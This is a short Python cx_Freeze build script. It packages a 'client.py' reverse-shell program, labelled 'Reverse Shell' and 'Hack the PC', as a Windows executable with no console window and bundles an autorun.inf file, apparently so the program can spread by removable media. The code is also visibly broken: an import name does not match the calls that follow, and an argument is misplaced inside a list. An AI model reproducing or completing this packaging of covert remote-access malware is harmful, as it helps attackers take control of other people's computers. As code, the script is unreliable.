import sys
from cx_Freeze import setup_Executable

include_files = ['autorun.inf']
base = None

if sys.platform == "win32":
    base = "Win32GUI"

setup(name="Reverse Shell", version="0.1", description="Hack the PC", options={'build_exe': {'include_files': include_files}}, executables=[Executable("client.py"), base=base])
